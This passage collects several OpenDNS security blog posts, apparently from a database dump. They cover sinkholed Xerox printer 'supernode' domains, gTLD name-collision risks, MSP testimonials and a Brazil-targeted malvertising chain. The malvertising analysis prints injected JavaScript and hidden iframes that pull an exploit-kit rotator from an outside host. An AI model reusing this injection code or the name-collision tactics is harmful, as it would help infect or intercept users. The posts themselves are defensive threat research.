that creates an increase in proxy activity without a legitimate reason.\nThanks to our monitoring systems, we can react fast and optimize our customers browsing experience before they even notice that an incident is taking place. Similar to security updates, each server in the fleet is responsible for pushing its own statistics to a centralized database. We use tools built in-house to visualize the data as well as open source projects such as Graphite and Nagios to alert whenever anomalies are detected. Examples of these visualizations are shown below.\n\n\nA platform for growth\nAt the time of this blog post we are mostly looking at HTTP traffic, but we have big plans for the Intelligent Proxy. From the beginning we have been building this architecture to support more protocols and inspect the data using a variety of techniques in parallel. Our team is constantly coming up with new ideas to leverage data from the billions of DNS queries we serve daily, as well as looking for innovative partners to collaborate with. As you can see, the OpenDNS Proxy is actually a platform. It provides multiple layers of inspection without impacting the end user experience or configuration. We can easily scale up and add servers if the need arises. We are very excited to work on this project and plan on providing many exciting new features in the upcoming months.

We at OpenDNS, however, believe that when talking about IP-enabled devices, a new and more targeted adage should be followed:\n“Read [the documentation] twice, connect [the device] once.” – Andrew Hay\nHere’s why. We all live busy lives. So busy, in fact, that many believe that computer printers haven’t really changed much over the years to warrant reading the instructions. Sure, many newer models can be connected to your local network but that’s only for internal network connectivity, right? Unfortunately, that is not the case.\nThe Discovery\nWhile conducting some research, we happened to notice a rather odd domain name that a particular server was beaconing out to. The domain in question was xeroxdiscoverysupernode3.com. Initially, we figured that the domain could be malware or phishing related as the likelihood of Xerox Corporation using such a long domain was relatively low. Upon further investigation, the xeroxdiscoverysupernode3 domain wasn’t even registered. Could a piece of malware have been constructed to call out to this specific domain to download additional files? Why wouldn’t the malware author register the domain ahead of time if that was the plan?\nAs this domain ended in the number 3, we pondered the idea of there being a ‘1’, ‘2’, or maybe even a ‘4’ numbered domain that followed this same pattern. It turned out that xeroxdiscoverysupernode1, xeroxdiscoverysupernode2, and xeroxdiscoverysupernode3 were actively being queried for within the OpenDNS global infrastructure. Not only were the domains being queried, but each was receiving roughly 2,000 queries per hour (as seen below). The plot thickens.\n\nWe began searching Google for the domains in question by using the following search string:\nhttps://www.google.com/search?hl=en&as_q=xeroxdiscoverysupernode1+xeroxdiscoverysupernode2+xeroxdiscoverysupernode3\nWithout much difficulty we were able to find several official Xerox documents that detailed the purpose of the domains. The Xerox® WorkCentre® 5845/5855/5865/5875/5890 System Administrator Guide talks about the McAfee Embedded Control features that provides 2 specific security functions:\n1) Enhanced Security maintains the integrity of printer software by monitoring system files and alerting you if an unauthorized change is made to a system file.\n2) Integrity Control is a software option that combines enhanced security features with the ability to monitor and prevent unauthorized executable files from running. Enable this option by providing a feature installation key on the Feature Installation page.\nDeeper into the documentation, we noticed a section entitled Designating Printers as Super Nodes. According to the documentation, the “Xerox® extension for McAfee [ePolicy Orchestrator] ePO uses up to three Xerox® printers as supernodes to communicate with the other Xerox® printers that it monitors. Xerox recommends that you designate more than one Xerox® printer as a supernode. If one supernode is not functioning or is offline, McAfee ePO can use the other supernodes to communicate with other printers. You designate printers as supernodes by adding specific entries to your DNS server.” The section continues to state that “Your Xerox® printers and your McAfee ePO server must use the same DNS server.”\nThe first mention of the suspicious domains shows up in the Adding DNS Entries to One or More Existing Domains section. It states:\nIf you have a small number of domains in your network, use this method to add DNS entries to each domain.\nOn your DNS server, find the domain of each printer that you want to designate as a supernode.\nFor each domain, add entries for all supernodes, then name them:\n– XeroxDiscoverySuperNode1– XeroxDiscoverySuperNode2– XeroxDiscoverySuperNode3\nIf your network uses more than one DNS server, repeat the previous step for all other DNS servers. If you have a large number of domains in your network, use this method to add DNS entries to a single  domain.\nOn your DNS server, create a domain named Xerox.local. The Xerox extension for McAfee ePO looks for a domain with this name.\nFor Xerox.local, add entries for each supernode, then name them:\n– XeroxDiscoverySuperNode1– XeroxDiscoverySuperNode2– XeroxDiscoverySuperNode3\nNote that it doesn’t say xeroxdiscoverysupernode[1-3].com, just the domain without the TLD. It should also be noted that neither Xerox, nor McAfee, show any results for a ‘xeroxdiscoverysupernode’ query on their respective sites:\n– http://www.xerox.com/search?q=xeroxdiscoverysupernode\n– http://www.mcafee.com/apps/search/default.aspx?region=us&q=xeroxdiscoverysupernode&searchSubmit=Go\nLooking at the OpenDNS query traffic for April 17 through April 20, 2014 (inclusive) we were able to identify 142 unique hostnames attempting to query the three xeroxdiscoverysupernode domains. A map indicating the approximate host geolocations can be seen below.\n\nThe Domains and The External Sinkhole\nFurther Google searches also lead us to Internet Corporation for Assigned Names and Numbers (ICANN) List of rSecond-Level Domains (SLDs) to Block list which expressly calls out the three suspicious domains.\n\nIn an effort to proactively deny the use of these domains by potentially malicious users, we registered the 3 domains and pointed them at a VPS. This server acted as an external sinkhole of sorts for all public queries to the xeroxdiscoverysupernode[1-3].com domains. On the external sinkhole we ran several packet captures using tcpdump to identify some ports associated with Xerox printers. With our port samples we went back to the Xerox documentation. The port that jumpe\nd out almost immediately was port 3702.\nUnfortunately, the information about the port was quite limited in the Xerox® WorkCentre® 5845/5855/5865/5875/5890 System Administrator Guide – stating only that it was “WS-Discovery (UDP port 3702)”. As we were seeing both TCP and UDP on this particular port, back to Google we went looking for keywords like “xerox+3702+tcp+udp filetype:pdf”. It wasn’t long before we found  38,900 results. The most descriptive was the Xerox WorkCentre™ 7525/7530/7535/7545/7556 Information Assurance Disclosure Paper Version 1.1 document which stated:\n2.8.2.21. Port 3702, WSD Discovery, WS Discovery Multicast\nThis is the default port for WS-Discovery (the discovery of services in an ad hoc network with a minimum of networking services (for example, no DNS, UDDI or other directory services). It does this by announcing or advertising the existence of the printer and its services on the network when it becomes available, and announcing its departure when unavailable. The default state is selected (enabled).\n(Note: emphasis added)\nFurther investigations on the WS-Discovery protocol led me to several sites which described the protocol, including:\n– WS-Discovery From Wikipedia, the free encyclopedia,\n– Windows 2003 Web Services Dynamic Discovery (WS-Discovery), and\n– OASIS Web Services Dynamic Discovery (WS-Discovery) Version 1.1\nIt looked as though we had found what we were looking for. To monitor the traffic more easily, we installed  ntopng to get a sense of just how many queries were being made. As you can see from the cumulative stats below, quite a bit of traffic was heading towards the server.\n\nAnalysis of the domains shows 327 unique hosts querying the external sinkhole. The map on the left shows the OpenDNS queries and the right-hand side shows the external sinkhole queries.\n\nThe combination of both OpenDNS client queries and the external sinkhole queries results in 422 unique hosts. The map below shows the cumulative hosts.\n\nThe OpenDNS Sinkhole\nAt this point we decided to sinkhole the domains for OpenDNS customers and monitor the queries. The internal sinkhole showed SOAP queries that resembled the following:\n{\r\n \"dport\": 3702,\r\n \"ip_src\": \"a.b.c.d\",\r\n \"payload\": \"POST / HTTP/1.1rnHost: 54.193.55.93:3702rnUser-Agent: gSOAP/2.8rnContent-Type: application/soap+xml; charset=utf-8; action=\"http://schemas.xmlsoap.org/ws/2005/04/discovery/Hello\"rnContent-Length: 2268rnConnection: closernSOAPAction: \"http://schemas.xmlsoap.org/ws/2005/04/discovery/Hello\"rnrnn<wsa\",\r\n \"ts\": 1398203136\r\n}\nThe SOAP requests confirmed that port 3702 queries were, in fact, WSD queries. It would be a trivial exercise to write a client to interact with this request as the protocol information is freely available and relatively easy to understand (see the external presentation below).\n\nWeb Services Discovery for Devices  from Jorgen Thelin\nSetting up a ‘fake’ WSD server could potentially allow a malicious user to do any number of things from sending print jobs to printers to tie up resources, pushing down customized drivers to allow further access, or even something as simple as reseting the devices back to factory defaults to deny people access to the devices.\nAlex Stamos, formally of iSec Partners and now the CISO of Yahoo!, had a fantastic presentation entitled Attacking Web Services: The Next Generation of Vulnerable Enterprise Applications that he presented at CanSecWest in 2006 that provided quite a bit of background on how web services could be exploited.\nIt is entirely possible that someone has already attempted to perform some form of malicious act using these super node domain names. Looking at OpenDNS Investigate we can see that the xeroxdiscoverysupernode3.com domain has a co-occurrence with a suspicious looking domain (seen below):\n\nAs presented in Frank Denis’ blog post, the infection chain for serving a single piece of malware is frequently made of many, constantly-changing domains. The security community finds thousands of new sites serving malware or acting as intermediaries every day. Hosts used to control botnets are also constantly changing in order to be resilient to takedowns. The cizjvdm…qsyd.biz domain has a very high DGA score which is indicative of a domain that was randomly generated by an algorithm.\n\nAnother observation is that the domain in question has co-occurrences with other DGAs which could indicate a malicious campaign of some sort.\n\nInteresting, but not yet conclusive. Further investigation by the OpenDNS Security Labs on these domains may shed some light on the campaign objectives.\nWho is affected?\nWe do not want to implicate the individual companies observed but we did, however, want to provide a breakdown of the vertical industries represented in the traffic:\n– Automotive– Consumer– Engineering– Energy– Oil and Gas– Fast-Moving Consumer Goods (FMCG)– Food and beverage– Healthcare– Insurance– Manufacturing– Retail– Technology– Telecommunications\nThere were also 5 companies listed in the Fortune 500 which means that this issue is not isolated to organizations of any size or security program maturity level.\nAs stated previously, OpenDNS has added the xeroxdiscoverysupernode[1-3].com domains to our sinkhole server, providing protection for all users of our DNS service (both free and paid). We will also continue to operate the external sinkhole for the time being but may opt to forward the queries for the super node domains to a dead IP instead of an actual live server. This would prevent anyone from using the super node domains for malicious purposes.\nHad we not registered the domains and/or sinkholed the traffic, it’s entirely possible that a malicious actor could have exploited this threat vector to gain access to numerous printers, and potentially internal networks,  around the world.\nSo what are the next steps?\nBeaconing of this nature could serve to alert a potential attacker to the technology assets within your organization (or home). Do you really need the world to know that you’re using a specific brand of printer? Probably not.\nAt an absolute minimum, you should add these domain names to your internal DNS servers to ensure that future queries never leave your network. You may also want to add firewall and/or IPS rules to block domain-level access to the super node domains.\nFor individuals or organizations with any IP-enabled  devices, from printers to scanners to wireless access points, OpenDNS highly recommends that you allocate time to review the documentation, configuration settings, and software/firmware version. For existing devices, a frequent review process should exist as part of the device lifecycle management policy and device-specific procedure. For new devices…read the documentation twice, connect the device once! Never put anything on your corporate or home network without first understanding its expected behavior.\nThis threat vector would not exist if documentation was read carefully and devices were not carelessly introduced into corporate and home networks.\nWe hope you have found this post educational.

This year’s Kaseya Connect certainly delivered, as hundreds of our Managed Service Provider (MSP) partners descended on Las Vegas to learn, network, and party a little with their peers. I expected to come back with great ideas, real world feedback, and feature requests from our partners. I did not anticipate what happened next: Damian Stalls from Fluid Networks came to the OpenDNS booth to meet the team and told us about the Kaseya automated deployment and monitoring scripts he had built for Umbrella. I was thrilled when Damian offered to talk after the conference and share his automations with the community.\nFluid Networks is an MSP headquartered in Southern California with a national customer base. They deploy Umbrella to every managed service customer as a standardized process. Damian describes Umbrella as “ a critical layer of assured security for us and our clients. We deploy it for all customers and don’t charge extra for it. Deploying Umbrella is important to ensure that our customers are protected and to free us up from having to waste time on remediating malware.”  Damian added that he has been tracking threats like CryptoLocker but “none of our customers were encrypted and that’s one great proof point of its value.”\nDamian also talked about the importance of automation to their business and to their customers. “Our goal is to be as automated as possible. We have a standing order for the team: If you have to do the same thing 3 or more times manually, raise your hand and get it automated. The last thing we want is our engineers wasting time doing something manually while our customers are waiting for something to get fixed.”  This focus on automation not only helps make an MSP more efficient, but also improves customer satisfaction.\nSince coming back from Kaseya Connect, Damian has posted his script along with SQL changes and instructions on Kaseya’s knowledge exchange.  Besides deploying the Umbrella Roaming Agent, the script adds monitoring and automated tests to verify that customers are being protected.   The script automatically runs the Umbrella diagnostic tool in the background and parses the results to verify that the agent is running and applying policy. In the rare event that it does encounter an issue, the script will automatically re-deploy the agent using customer specific parameters stored in Kaseya and test again. Furthermore, if a customer adds a new managed end-point, the script will automatically deploy the Umbrella agent to ensure consistent protection. The success or failure of the automations create tickets to help an MSP track automations performed and be alerted of any issues.  Damian also included instructions on how to set up monitors for the roaming agent.\nTake a look at Damian’s automations here.\nHave your own RMM automations for Umbrella?

If you are not familiar with the concept of a ‘spike’ it’s essentially time allotted for research, design, prototyping, and exploration. Scaled Agile Framework has a good article here on spikes if your are looking for more details.\nOur challenge around spikes was that the engineering teams often found it difficult to balance the amount of scheduled work with the desire to work on spike-related projects – a problem not unique to our organization. With that we decided to create Friday Spikes.\nTiming\nAt OpenDNS we have a great culture of transparency and openness. One example of this is that each and every Friday after a catered lunch all employees take part in a Townhall. This is an all-hands meeting where we do a week-in-review, go over great successes, our roadmap, company news, and other company wide items of interest. The Townhall typically ends at 1:00pm and the spikes begin immediately after.\nOrganizing the Spike\nLeading up to Friday, the engineers are all encouraged to enter their spike ideas into our Trello Board. This is a great tool for keeping track of small projects and items. Essentially, we have ideas that get confirmed as spikes for that Friday and all of the engineering teams meet up and review the boards. The rules are pretty simple, we ask that nobody works alone and we strongly encourage people join teams that they regularly do not work with.\nOnce spikes are communicated people meet up at a designated area. Some meet in a conference room if a whiteboard is needed while others meet in a comfortable open space. Once assembled, the teams commence their spikes.\nCommunication and Output\nAt 4:30pm all of the engineers  get together to review spike-related progress, roadblocks, and overall status. This can include a demo, code samples, or a review of a whiteboard/idea, among others. This serves as a wrap-up meeting for the spikes and allows others to learn about and comment on what was done.\nHere is an example of some of the spikes we have done:\n\nNote: we had to blur out some of them for obvious reasons.\n\nWhat We Learned\nRunning Friday Spikes has been a valuable learning process and is proving to be a valuable component of our agile process. We have learned that having the cards ready beforehand really helps the team prepare for which spikes they will work on. We have also learned that engineers love the cross-team collaboration and often will join more than one spike team on a Friday. In fact, we’ve frequently heard engineers exclaim “Wow, I want to abandon my spike and work on this other great idea!”\nTo date we have had some excellent spikes that have been very useful in learning estimates, sharing ideas, and even shipping code.

It’s a brilliant service.”\nAs an MSP with an all-inclusive model, Craig includes Umbrella as a standard offering both for his benefit and that of his customers. “Additionally it’s important to see prevention of problems as a benefit to Abussi in reducing the number of support requests, so we do not make a charge to our clients for services from Umbrella – they are bundled into the monthly flat fee which our clients pay to benefit from our skills and expertise.\nAbussi’s Malware infection rate has dropped to……………….. well, our records show that from a total managed pool of around 500 PC’s, we have had 1 Malware infection in the past 12 months, and that was from a PC which was in a business which was absorbed into Abussi recently”.\nRead the rest of Craig’s brilliant post to see how he brings up topics like malvertising and standardizing security to his SMB clients on his blog.', 'MSP;Umbrella', 'https://umbrella.cisco.com/blog/2014/04/25/managed-services-always-carry-umbrella/');

In addition to the standard .COM, .ORG, and .NET TLDs, over 1,300 new names could become available in the next few years. These new  gTLDs and internationalized domain names (IDNs) are awesome ideas if you think about the creativity sparked around the names one can possibly register.\nSome examples include .SINGLES (2013-08-28) and .SEXY (2013-09-11). Right before last holiday season, .CHRISTMAS (11-21-2013) was made available for use. We are seeing more interesting ones coming out such as .RICH (2013-11-21) and .MEME (01-30-2014). .WTF became available on 03-07-2014.  The full effective list and registration can be found at ICANN or Mozilla Public Suffix list.\n204 new gTLD names were released between Oct 23, 2013 and April 04, 2014. DomainTools provides some excellent charts on the proliferation of the gTLDs.\n\n\nSecurity concerns and other risks around these new gTLDs have been extensively discussed as the new gTLD act rolls out. Unfortunately, the primary concern has focussed on traditional domain squatting for monetization purposes – and not on gTLD squatting for malicious purposes. According to a February 27, 2014 article published in Forbes by Daniel Fisher:\n[Domain squatters] might profit by snapping up domain names that happen to belong to well-known consumer brands. With the cost of dislodging a cybersquatter starting at a few hundred dollars and quickly escalating past $10,000 – with no possibility of imposing those costs back on the loser without engaging in even more expensive litigation — brand owners might find it easier to pay them to go away.\nWith so many new gTLDs, perhaps it’s a good time to do a bit of data extraction and analysis here at OpenDNS. Using an hour time slice, on two different days, across all of OpenDNS’ 22 data centers we discovered some interesting usage statistics.\nSecurity Risk #1. Name Collisions\nInternal network entities are often named with a set of unofficial gTLDs that are not yet available for registration in the public domain name space, such as .CORP, .HOME, .SITE, .GLOBAL, .LOCALHOST, or .LOCAL. Attackers may register hostnames that purposefully collide with these internal names in an effort to see the traffic that is only supposed to be visible on the internal network. A good practice against such attacks is to use internal DNS resolvers and declare them as authoritative for internal TLDs.\n.LOCAL, among a number of other gTLDs, are in the ICANN reserved gTLD and are immune to the collision problem.  The following is the list of reserved gTLDs:\nAFRINIC  IANA-SERVERS  NRO   ALAC  ICANN  RFC-EDITOR   APNIC  IESG  RIPE  ARIN\nIETF  ROOT-SERVERS  ASO  INTERNIC  RSSAC  CCNSO  INVALID  SSAC  EXAMPLE  IRTF\nTEST  GAC  ISTF  TLD  GNSO  LACNIC  WHOIS  GTLD-SERVERS  LOCAL  WWW  IAB\nLOCALHOST  IANA  NIC (source: ICANN reserved gTLDs)\n\n.CORP, .HOME, .SITE aren’t yet in the public gTLD pool. However, .NETWORK is a different story. We’re seeing hundreds of thousands requests to .HOME.NETWORK,  largely due to routers’ WIFI lookup queries. None of the 3000 hostnames on .NETWORK are currently resolving, but we’ll probably see name collisions as soon as the attackers figure out how useful squatting on this particular gTLD can be.\n\nSome examples of the .HOME.NETWORK gTLDs that we are currently seeing include:\ntracker.openbittorrent.com.home.network\nlocalhost.home.network\ninternalcheck.apple.com.home.network\nus.launcher.battle.net.home.network\napi.openweathermap.org.home.network\nus.patch.battle.net.home.network\ntracker.istole.it.home.network\nwindows.home.network\nnewuser.home.network\ndesktop.home.network\nisatap.home.network\nmaster.home.network\nhttp.home.network\nnas.home.network\nAs you can see, it would be quite easy for an attacker to register a number of commonly (and actively used) hostnames that a user’s computer might try to access outside of its home network. In fact, this ‘leakage’ is happening all over the world. Based on a quick query of yet-to-be-public gTLDs on April 5, 2014 we discovered 1,808 unique hosts leaking gTLD hostnames. A geographic distribution of these hosts can be seen below.\n\nThe following chart shows the top 30 new gTLDs ranked by the number of unique hostnames queried.\n\n\n\nSecurity Risk #2. Phishing, Spamming, Typosquatting\nPhishing, spamming and typo squatting can take advantage of the much larger name space. In addition, some of these gTLDs like .BUSINESS, .ENTERPRISE or .WORK delivering a trustworthy business name will allow free or much cheaper name association compared to registering on .COM or .NET. For instance, facebookgame.directory is seen on the same IP (184.168.221.96) as  www.coresfacebook.net, which is a known spam site.\nSome of other example names (not necessarily malicious) seen in OpenDNS traffic are:\napi.facebook.com.blue.\n api.facebook.com.business.\n api.facebook.com.life.\n b-api.facebook.com.internet.blue.\n graph.facebook.com.business.\n graph.facebook.com.casa.\n orcart.facebook.com.business.\n orcart.facebook.com.casa.\n orcart.facebook.com.life.\n puntlandpost.facebook.com.home.network.\n vh89cm7thwnvq1qc.www.facebook.com.network.\n www.facebook.com.hi.link.\nAnother interesting domain that we found was: api.opendns.com.work.\n\nSecurity Risk #3: Are Designated Registrars for New gTLDs Easier to Compromise?\nThere used to be only a handful root servers managing gTLDs and, historically speaking, these servers have been fairly secure and reliable. The new registrants of these gTLDs, however, could potentially be more easily compromised than their well-established peers. The same can be said of any new online service provider rushing to get operational too quickly. The gTLD names we’re seeing are allocated across roughly 200 registrars and the following chart shows the top 10, ranked by the number of unique names served.\n\nSecurity Risk #4. Too Little Information\nGeneric Whois databases are not yet giving whois information on these domains and Google is not yet indexing these domains. The names appear to be in a huge Internet ‘fog’ that the world cannot yet peer into – a great scenario that attackers can take advantage of.  There is nothing we can find around these names except the traffic patterns we’re seeing at OpenDNS and the IP addresses some of them resolve to. Roughly 12% of names on the new gTLD now resolving a valid IPs.\nWhen evaluating the IP addresses we’re seeing, there are a good number associated with known malicious sites. One example of this is where fruit.directory is hosted – 72.52.4.90. We have observed this IP address hosting more than 170 malicious domains over the past week.\n\nOpenDNS Labs will continue to monitor and report on the usage of these new DNS names. Some final notes to consider:\nThe defenders have yet to catch up with deriving methods for evaluating the security risks of these new TLDs,\nMany reputation based system are rendered useless with so little known about them. For example, we have established reputation indicators around existing TLDs such as .RU, .KZ. Those TLDs have a statistically larger ratio of bad domains vs. benign ones.\nAlgorithmic detection methods need to pick up an entirely new spectrum of heuristics and indicators to correctly classify them.\nSamples from these new name spaces must be collected and analyzed before they can be used to derive machine learning models to classify the names in the new TLD space.\nThat’s all for now. Look for future research on the proliferation of these in-the-wild gTLDs including how OpenDNS classifies the domains and has observed their use.\nPhoto Credit: Skley via Compfight cc', 'Big Data;Security Research', 'https://umbrella.cisco.com/blog/2014/04/23/malicious-gtld-squatting/');

It can refer to the reason you have to pay exorbitant fees while travelling, or that ex that you had to cut ties with before they went fatal attraction on you.\nSo applying the term “baggage” to Internet security may seem strange, but when it comes to trying to protect your users from all of the nasty bits on the big bad Internet, there is definitely a lot of baggage associated with the current deployment models and approaches offered by legacy security vendors.\nThe IT world is rapidly evolving from castles and moats into clouds and dissolving perimeters, and as such organizations have to re-think how to secure their users and their all-important data. These trends have also afforded legacy network security companies the opportunity to unapologetically chant “We’re doing it all wrong! Let’s get it right this time!”, while in the next breath explaining how their existing products are leveraging the cloud and everything will be different this time.\nBut when the rubber meets the road, the baggage is still there. So here are a few recommendations that we think are useful to consider when thinking about how to evolve your approach to security in the coming months and years.\n#1: Don’t get in the way of your users\nYou shouldn’t have to trade off performance or ban access to new technology to protect your users.\nFor starters, let’s acknowledge that job #1 is to enable your users to get their jobs done without creating undue risk for your organization, and part of that means allowing them to leverage some of the amazing new services and technologies that are emerging to gain an advantage over the competitors in your industry.\nSome examples of trade-offs that get in the way of users include:\nRequiring your users to VPN back into the office network\nThe value here is being marginalized as your data and mission-critical services continue to slip out the back door and into the cloud. And that doesn’t even account for the fact that most of your users likely aren’t doing this reliably anyways, and are thus exposed whenever they leave your network.\nHeavyweight scanning that slows your users down\nThis trade off is one that frustrates users to no end, whether it’s occurring via an endpoint agent or because all traffic is being pushed through proxies.\nThe baggage you want to shed here is the idea that you can’t deliver excellent security without imposing a performance, manageability, or convenience tax on your users. And even if you’re making it work today without such taxes, you might still be seriously neutering those users from leveraging new technology to enable your business.\nAt OpenDNS, our focus is to build products that have zero end-user impact, and can even improve their Internet experience. We do that by depending on our extremely lightweight but effective DNS-based layer, and our resilient global network.\n#2. A lightweight, contextual approach goes a long way\nYou don’t need to inspect every transaction in the same heavyweight way to deliver excellent security.\nDespite the fact that ~98% of your organization’s traffic will be allowed, all Web security products require you to inspect every single connection, in exactly the same way. This imposes complexity and creates performance and scalability issues in scenarios where: a) it’s very unlikely that threats will traverse, and b) your security vendor is likely to miss if it’s a zero-day attack on a generally trusted cloud service.\nThe baggage you want to shed here is the idea that you must push all of your traffic through a security solution always in the same way with the same depth, or else your approach to security is flawed.\nAt OpenDNS, we have always found it counter-intuitive that the lightest-weight approach to security is one that’s largely been ignored. Obviously, here we’re talking about DNS. With OpenDNS’ Umbrella product, we enforce responsive security by using DNS as the first opportunity to make a decision to block, inspect further, or allow based on our unique macro view of the threat landscape. We believe that we need to use our threat intelligence to make informed decisions on which connections warrant deeper inspection and which connections can be trusted, and only use heavyweight analysis if our intelligence indicates it’s necessary.\n#3. Protect your users ALL of the time\nProtection shouldn’t disappear when your users go outside your castle walls.\nEven Ron Burgundy knows that it doesn’t make sense if something “works 60% of the time, every time”.\n\nIn today’s enterprises, it’s normal to have a large\npopulation of users that take their laptops (and obviously, their mobile devices) outside your network. They’re often expected to VPN back into the network to avoid being exposed in coffee shops or airport wifi networks, but much of the time they don’t bother.\nThose who are thinking, “my users have Macs so they\naren’t exposed,” are kidding themselves. Commodity attackers are often focused on stealing credentials used to access services like SalesForce and Google Apps. With no protection against those types of threats, your users are exposed when they leave the confines of your well-protected network.\nThe baggage you want to shed here is the idea that hardware-based security solutions provide you the protection you need. Your network is de-centralizing along with your data and your users, and to really protect them all of the time, you need a cloud-based security solution.\nAt OpenDNS our mantra is to “Enable the world to connect with confidence on any device, anywhere, anytime.” Umbrella allows organizations to easily deploy lightweight protection across their distributed network that fulfills this vision and doesn’t compromise their security depending on where their users happen to be working.\n#4. Don’t invade your user’s privacy\nYour approach to security shouldn’t compromise the trust between you and your users.\nUsers are taking their work laptops with them…everywhere. Whether they’re bringing them home, to a coffee shop, or on business trips, they want to be able to take care of personal business on those laptops as well as getting work done. As a security professional, do you really care if they’re watching YouTube videos or browsing Facebook from home on a work laptop?\nThe baggage you want to shed here is the use of security solutions that apply the same heavyweight policies without any sense of context. For instance, applying the same content filtering policy regardless of whether users are in the office or at home can suffocate your users and breed distrust between you and them.\nAt OpenDNS we’re working on new ways to transparently inspect traffic beyond DNS, like HTTP/S and other ports and protocols. Our approach is to to use privacy-sensitive defaults and apply rigorous security all of the time, but allow you to relax content filtering logging and policies when your users are outside the network.\nTaking this approach helps you become a partner, instead of an adversary to your users; the protective big brother instead of George Orwell’s version, which is much more palatable for your users.\n#5: Don’t try to solve people problems with blunt instruments\nFocus on excellent security instead of trying to solve easily circumvented productivity issues.\nIs it really worth it to worry about the time your users spend on Facebook and blocking or limiting when they can access it? More and more this is a losing battle because your users all have phones, tablets, and phablets (oh my!) that allow them to do whatever they want over their 3G or LTE connection.\nThe baggage you want to shed here is the idea that you want to expend a lot of time and money on technical solutions to productivity problems. These are people problems and those users need to be managed & incentivized to do their job well – something that can’t be solved with the click of a button.\nAt OpenDNS our goal is to deliver excellent security and good enough content filtering for you to be able to do your due diligence in preventing your users from accessing inappropriate content while in your work environment.\nConclusion\nSome of the above five points may be difficult for you today, but keep them in mind as you develop your internet security strategy moving forward.\nYou might also give Umbrella by OpenDNS a try and find that you’ve taken your first step down a path towards delivering security that works with the way the world works today, and enabling your business instead of hampering it.\nIt’s time to start shedding all that unnecessary baggage!', 'Umbrella', 'https://umbrella.cisco.com/blog/2014/04/10/5-recommendations-security-without-baggage/');

The dnsws[.]net authoritative servers were apparently not answering any queries about these domain names.\nWhy were queries to these being observed over and over again?\nTemporarily sinkholing these domains revealed that they were being loaded from a small set of compromised sites which people were redirected to via malvertising methods. Based on our research this was occurring primarily via Yahoo Ads.\nClients following this infection chain all had something in common: the user language. The user language, as specified by the Accept-Language header sent by web browsers, was Brazilian Portuguese (pt-BR).\nOur friends @vmmello and @alexcpsec further reported that these domain names were actually resolving in Brazil.\nTrying to access the URL observed in our sinkhole logs returned nothing but empty content. However, the same URL accessed from a client IP located in Brazil was serving something radically different.\nIn addition to some basic analytics code, this page included an iframe that ignited an exploit kit.\nThis campaign targeting Brazil was invisible to the rest of the world. A set of custom authoritative DNS servers was answering only some specific client IPs based on their geographical location. Also, the web server injecting the page with the malicious iframe was not answering clients outside of Brazil.\nThe first set of domains was taken down by the registrar. The bad guys shifted to a new set of domains immediately after, with winter-cdn[.]com being the first one we observed.\nBrowsing hxxp://www.winter-cdn.com, or the exact referrer displayed a page that simply read “This account has been suspended”.\n\nAt first, it sounded like good news. We had hoped that the hosting provider had already closed the bad actor’s account. Sinkholing this domain revealed that the following chain was being used to reach the site:\nYahoo malvertising (targeting Brazil) -> www[.]soloinvite[.]com -> www[.]winter-cdn[.]net\nAs it happens, browsing www[.]soloinvite[.]com also displayed a “This account has been suspended” banner.\nSo far, so good. Unfortunately, in mapping the location of the requesting clients, Brazil was still clearly targeted:\n\nWe tried to access these URLs using a popular VPN service that had a point of presence in Brazil. Unfortunately, all we got was the “this domain has been suspended” banner.\nCase closed? Not quite yet. We decided to keep investigating.\nAccessing the same URLs via the IP address of a residential ISP in Brazil returned noticeably different content:\n\nAt face value, this would have been a totally benign web site. That is, of course, if it didn’t contain the following code:\nfunction sendTest()\n{\n    var parameters = \"\";\n    document.getElementById(\"banner\").innerHTML=\"\";\n    if (window.XMLHttpRequest)\n    {// code for IE7+, Firefox, Chrome, Opera, Safari\n        xmlhttp=new XMLHttpRequest();\n    }\n    else\n    {// code for IE6, IE5\n        xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\n    }\n    xmlhttp.onreadystatechange=function()\n    {\n        if (xmlhttp.readyState==4 && xmlhttp.status==200)\n        {\n            document.getElementById(\"banner\").innerHTML=xmlhttp.responseText;\n        }\n    }\n\n    var a=Math.floor(Math.random()*11);\n    var b=Math.floor(Math.random()*11);\n\n    parameters = \"a=\"+ b + \"&b=\" + b + \"&c=\" + (a+b);\n    xmlhttp.open(\"POST\",\"/ads/banner.php\",true);\n    xmlhttp.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");\n    xmlhttp.send(parameters);\n}\n\nsetInterval(sendTest(),1000);\nWhen loaded from a browser (instead of a web crawler) a fake banner is loaded. This looks like the following:\n<iframe id=\"frmAdResell\"\nsrc=\"hxxp://www.winter-cdn.com/…\" height=0 width=0\nframeborder=0></iframe>\nThe content of this iframe was similar to what was previously observed. It contained some basic analytics as well as a rotator for the exploit kit code:\n<iframe id=\"frmAdResell_24779\" name=\"frmAdResell_24779\" src=\"hxxp://iu6zb8663m7p45ce4i-be1.maxcredite.ru\" frameborder=\"0\" height=0 width=0 ></iframe>\n<script type=\"text/javascript\">\nvar sc_project=9455979;\nvar sc_invisible=1;\nvar sc_security=\"35c41416\";\nvar scJsHost = ((\"https:\" == document.location.protocol) ?\n\"https://secure.\" : \"http://www.\");\ndocument.write(\"<sc\"+\"ript type=\'text/javascript\' src=\'\" +\nscJsHost+\n\"statcounter.com/counter/counter.js\'></\"+\"script>\");\n</script>\nMalware authors constantly up their game to evade automated detection. This infection chain, however, also features deception techniques in order to confuse security researchers during manual investigations:\nCustom authoritative DNS servers, only returning answers to a specific set of clients. Because we do not currently have a point of presence in Brazil, this fooled some of our generic detection models.\nDomain names referring to a Content Delivery Network, which researchers are usually reluctant to block.\nFake mention of an account having been suspended, which suggests to researchers that the case has been closed and that no further investigation is needed. Connecting from one of the targeted networks is the only way to see the actual content.\nVPNs with a presence in the targeted country do not necessarily reveal the real content either.\nUnfortunately, these techniques appear to be quite successful, with only 1 other security vendor out of 51 having flagged some of these domains as malicious.\n\nThis particular issue illustrates the need to explore and combine different techniques to successfully track malware. Also, continuous tweaking and improvement of methodologies, classifiers, and inspection capabilities is required to keep pace with the attackers.', 'Malware;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2014/04/02/suspended-domains-actually-targeted-attacks/');

